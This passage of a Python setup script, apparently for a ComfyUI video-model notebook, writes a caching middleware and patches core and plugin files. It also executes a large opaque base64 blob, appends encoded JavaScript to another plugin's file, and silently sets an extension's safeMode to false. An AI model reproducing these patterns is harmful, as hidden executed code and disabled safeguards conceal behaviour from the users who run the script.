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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

# Automatically deploy user's saved cloud workflow into ComfyUI workflows directory
import zlib as _uz, base64 as _ub
_user_wfs = json.loads(_uz.decompress(_ub.b64decode("...")).decode("utf-8"))
# Install Smart LoRA Auto-Trigger-Word Frontend Extension
import base64 as _jb64
_vhs_core_p = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/web/js/VHS.core.js"
if os.path.exists(_vhs_core_p):
    _vhs_s = open(_vhs_core_p, "r", encoding="utf-8").read()
    if "__H3_LORA_AUTO_TRIGGER_V3__" not in _vhs_s:
        open(_vhs_core_p, "a", encoding="utf-8").write("\n" + _jb64.b64decode("...").decode("utf-8"))
os.makedirs("/content/ComfyUI/user/default/workflows", exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
for _ufn, _udata in _user_wfs.items():
    for _tdir in ("/content/wf_pool_h3", "/content/ComfyUI/user/default/workflows"):
        _upath = os.path.join(_tdir, _ufn)
        if globals().get("重置默认工作流", False) or not os.path.exists(_upath) or os.path.getsize(_upath) < 100 or json.load(open(_upath, encoding="utf-8")).get("extra", {}).get("template_v") != 5:
            json.dump(_udata, open(_upath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
# In-place align only the active H3 model & CLIP on existing workflows (preserving all user prompt/parameter edits)
for _tdir in ("/content/ComfyUI/user/default/workflows", "/content/wf_pool_h3"):
    for _wfn in sorted(os.listdir(_tdir)):
        if _wfn.endswith(".json") and not ("qwen" in _wfn.lower() or "千问" in _wfn):
            _wp = os.path.join(_tdir, _wfn)
            try:
                _wf = json.load(open(_wp, encoding="utf-8"))
                _all_n = list(_wf.get("nodes", []))
                for _sg in _wf.get("definitions", {}).get("subgraphs", []):
                    _all_n.extend(_sg.get("nodes", []))
                for _n in _all_n:
                    _nt = _n.get("type", "")
                    _wv = _n.get("widgets_values")
                    if _nt == "UNETLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_model
                    elif _nt == "CLIPLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_clip
                    elif _nt == "FeiHouEasyH3Loader" and isinstance(_wv, list) and len(_wv) >= 3:
                        _wv[0], _wv[1], _wv[2] = target_model, target_model, target_clip
                    elif _nt == "FeiHouEasyH3RemixLoader" and isinstance(_wv, list) and len(_wv) >= 2:
                        _wv[0], _wv[1] = target_model, target_clip
                    elif _nt == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(_wv, list) and len(_wv) >= 7:
                        _wv[5], _wv[6] = target_model, target_clip
                json.dump(_wf, open(_wp, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass

# Ensure all official & community model/CLIP/VAE/Upscaler filenames are symlinked so no workflow ever reports 'missing model'
_vae_dir = "/content/ComfyUI/models/vae"
for _dup_vae in ["minimax_h3_video_vae_bf16.safetensors", "minimax_h3_video_vae_fp32.safetensors", "minimax_h3_video_vae.safetensors", "minimax_h3_audio_vae_bf16.safetensors", "minimax_h3_audio_vae_fp16.safetensors", "minimax_h3_audio_vae.safetensors", "minimax_h3_video_vae_int8_convrot.safetensors"]:
    _dup_vp = os.path.join(_vae_dir, _dup_vae)
    if os.path.islink(_dup_vp) or os.path.exists(_dup_vp):
        try: os.remove(_dup_vp)
        except Exception: pass
if not os.path.exists(os.path.join(_vae_dir, "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors")):
    subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=error", "-d", _vae_dir, "-o", "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors", "https://huggingface.co/speach1sdef178/MiniMax-H3-X2-Detail-VAE/resolve/main/MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors"], check=False)


# Auto-guard in comfy/ldm/minimax/audio_vae.py in case AudioVAE is accidentally selected in a Video VAELoader node
_avae_p = "/content/ComfyUI/comfy/ldm/minimax/audio_vae.py"
if os.path.exists(_avae_p):
    _avae_s = open(_avae_p, "r", encoding="utf-8").read()
    if "_AUTO_VIDEO_VAE" not in _avae_s:
        _avae_s = _avae_s.replace(
            "        b, s, length = waveform.shape",
            "        if waveform.ndim >= 4:\n            import comfy.utils, comfy.sd\n            if not hasattr(self, '_AUTO_VIDEO_VAE'):\n                _sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n                self._AUTO_VIDEO_VAE = comfy.sd.VAE(sd=_sd)\n            return self._AUTO_VIDEO_VAE.first_stage_model.encode(waveform.to(self._AUTO_VIDEO_VAE.vae_dtype))\n        b, s, length = waveform.shape"
        )
        open(_avae_p, "w", encoding="utf-8").write(_avae_s)

# Also patch comfy/sd.py so if AudioVAE is accidentally connected to Video VAE encode/decode, it auto-switches to VideoVAE in-place
_sd_p = "/content/ComfyUI/comfy/sd.py"
if os.path.exists(_sd_p):
    _sd_s = open(_sd_p, "r", encoding="utf-8").read()
    if "_AUTO_SWAP_VIDEO_VAE" not in _sd_s:
        _sd_s = _sd_s.replace(
            "    def encode(self, pixel_samples):",
            "    def encode(self, pixel_samples):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(pixel_samples, 'ndim') and pixel_samples.ndim >= 4:\n            # _AUTO_SWAP_VIDEO_VAE\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        _sd_s = _sd_s.replace(
            "    def decode(self, samples_in, vae_options={}):",
            "    def decode(self, samples_in, vae_options={}):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(samples_in, 'ndim') and samples_in.ndim == 5:\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        open(_sd_p, "w", encoding="utf-8").write(_sd_s)

# Ensure loop_count and frame_rate in VHS_VideoCombine are optional with defaults so ComfyUI 0.43 never reports missing loop_count or frame_rate
_vhs_np = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/videohelpersuite/nodes.py"
if os.path.exists(_vhs_np):
    _s = open(_vhs_np, "r", encoding="utf-8").read()
    _s_orig = _s
    _old_lc = '''                "loop_count": (
                    "INT",
                    {"default": 0, "min": 0, "max": 100, "step": 1},
                ),'''
    _lc1 = '                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),\n'
    if _lc1 in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_lc1, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    elif _old_lc in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_old_lc, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    _s = _s.replace("        frame_rate: int,\n        loop_count: int,", "        frame_rate: int = 24,\n        loop_count: int = 0,")
    if _s != _s_orig:
        open(_vhs_np, "w", encoding="utf-8").write(_s)

# Auto-install AI 角色三合一参考图集 (ai-pose-gallery-zh) & H3 FaceRefine / OneClickSwap custom nodes
_cn_dir = "/content/ComfyUI/custom_nodes"
if os.path.isdir(_cn_dir):
    for _rn, _ru in [
        ("ai-pose-gallery-zh", "https://github.com/anhao/ai-pose-gallery-zh.git"),
        ("ComfyUI-H3-FaceRefine", "https://github.com/Carasibana/ComfyUI-H3-FaceRefine.git"),
        ("comfyui-h3-oneclick-swap", "https://github.com/D3voz/comfyui-h3-oneclick-swap.git"),
    ]:
        _rp = os.path.join(_cn_dir, _rn)
        if not os.path.exists(_rp):
            print(f"📦 正在自动安装插件: {_rn} ...")
            subprocess.run(["git", "clone", "--depth", "1", "-q", _ru, _rp], check=False)

_pca_ext = "/content/ComfyUI/custom_nodes/ai-pose-gallery-zh/comfyui_plugin/web/extension.js"
if os.path.exists(_pca_ext):
    _pca_s = open(_pca_ext, "r", encoding="utf-8").read()
    if "this.safeMode = true;" in _pca_s:
        _pca_s = _pca_s.replace("this.safeMode = true;", "this.safeMode = false;")
        open(_pca_ext, "w", encoding="utf-8").write(_pca_s)

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
